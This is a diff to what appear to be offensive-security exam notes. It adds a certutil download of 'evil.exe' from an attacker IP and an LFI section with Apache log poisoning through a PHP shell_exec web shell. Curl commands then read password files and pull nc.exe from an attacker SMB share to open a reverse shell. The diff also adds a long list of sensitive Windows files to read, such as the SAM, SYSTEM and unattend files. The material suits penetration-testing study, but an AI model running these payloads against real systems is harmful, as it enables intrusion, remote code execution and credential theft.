@@ -131,6 +131,9 @@ copy file.txt \\10.10.14.2\folder\file.txt
 
 #C:\Users\kostas\Desktop>powershell -exec Bypass -C "New-PSDrive -Name 'SharedFolder' -PSProvider 'FileSystem' -Root '\\10.10.14.2\folder'"
 #C:\Users\kostas\Desktop>copy SharedFolder:\bfill.exe C:\Users\kostas\Desktop\exploit.exe
+
+#HTTP
+certutil.exe -urlcache -split -f "http://192.168.49.68/evil.exe" "C:\Backup\evil.exe"
 ```
 
 ## Vulnerability Discovery
@@ -299,6 +302,98 @@ dav:/> move cmd.txt cmd.aspx
 # davtest -url http://10.10.10.15
 ```
 
+#### LFI / RFI
+https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/
+
+```Shell
+wfuzz -c -t 500 --hc=404 --hw=35,41,32,39 -w paths.txt http://192.168.142.53:4443/site/index.php?page=FUZZ
+curl -s 'http://192.168.142.53:4443/site/index.php?page=C:\xampp\apache\logs\access.log' | head
+curl -A "<?php echo '<pre>' . shell_exec(\$_GET['cmd'])  . '</pre>'; ?>" -s 'http://192.168.142.53:4443/site/index.php?page=C:\xampp\apache\logs\access.log'
+```
+```Shell
+curl -A "exploting LFI" -s 'http://192.168.142.53:4443/site/index.php?page=C:\xampp\apache\logs\access.log&cmd=type%20..\..\passwords.txt' | grep \<pre\> -A 40
+```
+```Shell
+impacket-smbserver folder . -smb2support
+curl -A "exploting LFI" -s 'http://192.168.142.53:4443/site/index.php?page=C:\xampp\apache\logs\access.log&cmd=\\192.168.49.142\folder\nc.exe%20%2de%20cmd%2092.168.49.142%2080' | grep \<pre\> 
+```
+```Shell
+C:\Apache\conf\httpd.conf
+C:\Apache\logs\access.log
+C:\Apache\logs\error.log
+C:\Apache2\conf\httpd.conf
+C:\Apache2\logs\access.log
+C:\Apache2\logs\error.log
+C:\Apache22\conf\httpd.conf
+C:\Apache22\logs\access.log
+C:\Apache22\logs\error.log
+C:\Apache24\conf\httpd.conf
+C:\Apache24\logs\access.log
+C:\Apache24\logs\error.log
+C:\Documents and Settings\Administrator\NTUser.dat
+C:\php\php.ini
+C:\php4\php.ini
+C:\php5\php.ini
+C:\php7\php.ini
+C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
+C:\Program Files (x86)\Apache Group\Apache\logs\access.log
+C:\Program Files (x86)\Apache Group\Apache\logs\error.log
+C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
+C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
+C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
+c:\Program Files (x86)\php\php.ini
+C:\Program Files\Apache Group\Apache\conf\httpd.conf
+C:\Program Files\Apache Group\Apache\conf\logs\access.log
+C:\Program Files\Apache Group\Apache\conf\logs\error.log
+C:\Program Files\Apache Group\Apache2\conf\httpd.conf
+C:\Program Files\Apache Group\Apache2\conf\logs\access.log
+C:\Program Files\Apache Group\Apache2\conf\logs\error.log
+C:\Program Files\FileZilla Server\FileZilla Server.xml
+C:\Program Files\MySQL\my.cnf
+C:\Program Files\MySQL\my.ini
+C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.0\my.ini
+C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.1\my.ini
+C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.5\my.ini
+C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.6\my.ini
+C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.7\my.ini
+C:\Program Files\php\php.ini
+C:\Users\Administrator\NTUser.dat
+C:\Windows\debug\NetSetup.LOG
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\Panther\Unattended.xml
+C:\Windows\php.ini
+C:\Windows\repair\SAM
+C:\Windows\repair\system
+C:\Windows\System32\config\AppEvent.evt
+C:\Windows\System32\config\RegBack\SAM
+C:\Windows\System32\config\RegBack\system
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SecEvent.evt
+C:\Windows\System32\config\SysEvent.evt
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\winevt\Logs\Application.evtx
+C:\Windows\System32\winevt\Logs\Security.evtx
+C:\Windows\System32\winevt\Logs\System.evtx
+C:\Windows\win.ini
+C:\xampp\apache\conf\extra\httpd-xampp.conf
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\error.log
+C:\xampp\FileZillaFTP\FileZilla Server.xml
+C:\xampp\MercuryMail\MERCURY.INI
+C:\xampp\mysql\bin\my.ini
+C:\xampp\php\php.ini
+C:\xampp\security\webdav.htpasswd
+C:\xampp\sendmail\sendmail.ini
+C:\xampp\tomcat\conf\server.xml
+```
+
 #### Eternalblue
 ```Shell
 wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py
@@ -327,9 +422,6 @@ https://www.exploit-db.com/exploits/42031
 ```Shell
 python 42031.py 192.168.76.40 MS17-010/sc_x86_msf.bin
 ```
-
-#### SYSVOL 
-
 
 #### MS09_050 RCE SMB2 
 https://www.exploit-db.com/exploits/40280
@@ -450,6 +542,11 @@ powershell
 PS C:\> Set-ExecutionPolicy Unrestricted
 Import-Module .\Powerup.ps1
 Find-PathDLLHijack
+```
+
+### Task
+```Shell
+schtasks /query /fo LIST /v | select-string 'TFTP' -context 10 
 ```
 
 ### Group policy preferences
